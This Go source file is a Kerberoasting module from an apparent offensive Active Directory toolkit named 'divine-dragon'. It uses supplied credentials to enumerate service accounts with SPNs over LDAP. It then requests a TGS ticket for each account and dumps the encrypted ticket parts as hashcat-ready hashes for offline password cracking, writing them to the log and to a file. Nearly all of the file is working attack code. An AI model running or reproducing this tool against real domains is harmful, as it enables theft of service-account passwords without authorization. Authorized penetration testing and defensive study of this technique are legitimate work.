package remote_exploit

import (
	"divine-dragon/remote_enum"
	"divine-dragon/transport"
	"divine-dragon/util"
	"fmt"
	"os"

	"github.com/ropnop/gokrb5/v8/messages"
)

type KerberoastingModule struct {
	domain    string
	dc        string
	verbose   bool
	safemode  bool
	downgrade bool
	hashFile  *os.File
	username  string
	password  string

	kSession transport.KerberosSession
	kOptions transport.KerberosSessionOptions

	// ctx       context.Context
	// cancel    context.CancelFunc
	// threads   int
	// delay     int
	// counter   int32
	// successes int32

	logger util.Logger
}

func NewKerberoastingModule(domainOpt string, dcOpt string, usernameOpt string, passwordOpt string,
	safemodOpt bool, downgradeOpt bool, hashfilenameOpt string, verboseOpt bool, logFileName string) *KerberoastingModule {
	km := KerberoastingModule{
		domain:    domainOpt,
		dc:        dcOpt,
		username:  usernameOpt,
		password:  passwordOpt,
		safemode:  safemodOpt,
		downgrade: downgradeOpt,
		verbose:   verboseOpt,
	}
	km.logger = util.KerberoastingLogger(verboseOpt, logFileName)
	if hashfilenameOpt != "" {
		hashFile, err := os.OpenFile(hashfilenameOpt, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		km.hashFile = hashFile
		if err != nil {
			km.logger.Log.Errorf("Can't create a file for saving TGS - %v", err)
		}
		km.logger.Log.Infof("Saving any captured TGS to %s", hashFile.Name())
	}
	km.setupSession()
	return &km
}

func (km *KerberoastingModule) setupSession() {
	km.kOptions = transport.KerberosSessionOptions{
		Domain:           km.domain,
		DomainController: km.dc,
		Verbose:          km.verbose,
		SafeMode:         km.safemode,
		Downgrade:        km.downgrade,
	}
	k, err := transport.NewKerberosSession(km.kOptions)
	if err != nil {
		km.logger.Log.Error(err)
	}
	km.kSession = k

	km.logger.Log.Info("Using KDC(s):")
	for _, v := range km.kSession.Kdcs {
		km.logger.Log.Infof("\t%s\n", v)
	}
}

func (km *KerberoastingModule) Run() {
	lem := remote_enum.NewLdapEnumModule(km.domain, km.dc, "389", km.username, km.password, "", true, "")
	SPNs, err := lem.RunAndQueryOnlyKerberoastableUsers()
	if err != nil {
		km.logger.Log.Errorf("can't enumerate kerberoastable users: %v", err)
	}
	if SPNs != nil {
		km.logger.Log.Notice("Enumerated some SPNs for AD users:")
		for username, SPN := range SPNs {
			fmt.Printf("\t%s - %s\n", username, SPN)
		}
		km.logger.Log.Notice("Dumping encrypted part of TGS for these users:")
		for username, SPN := range SPNs {
			tkt, err := km.kSession.ReceiveTGS(km.username, km.password, SPN)
			if err != nil {
				km.logger.Log.Errorf("can't extract encrypted part from TGS: %v", err)
			}
			km.DumpTGSHash(tkt, username, SPN)
		}
	}
}

func (km *KerberoastingModule) DumpTGSHash(tkt messages.Ticket, username string, spn string) {
	hash, err := util.TGSEncPartToHashcat(tkt, username, spn)
	// TODO:
	// Think about a way to save hash in temp file if filename was not specified.
	// Think about a way to run hashcat in a new process with proper command to crack the hashes
	// Maybe CLI will ask user to run hashcat...
	if err != nil {
		km.logger.Log.Debugf("[!] Got encrypted TGS for %s, but couldn't convert to hash: %s", username, err.Error())
		return
	}
	km.logger.Log.Noticef("[+] %s has SPN set to %s. Dumping hash to crack offline:\n%s", username, spn, hash)
	if km.hashFile != nil {
		_, err := km.hashFile.WriteString(fmt.Sprintf("%s\n", hash))
		if err != nil {
			km.logger.Log.Errorf("[!] Error writing hash to file: %s", err.Error())
		}
	}
}
